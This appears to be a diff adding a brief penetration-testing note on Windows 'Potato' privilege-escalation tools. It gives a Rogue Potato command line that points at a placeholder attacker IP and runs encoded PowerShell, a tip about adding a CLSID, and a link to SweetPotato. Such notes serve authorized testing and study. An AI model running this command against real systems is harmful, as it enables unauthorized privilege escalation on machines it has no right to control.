@@ -1,0 +1,5 @@
+- Potatoes
+	- Rogue Potato
+		- `.\RoguePotato.exe -r <attacker IP> -e "cmd.exe /c powershell -enc <base64 encoded powershell> -l 9999`
+			- Might have to look up a CLSID and add a `-c “{<CLSID>}"`
+	- https://github.com/CCob/SweetPotato
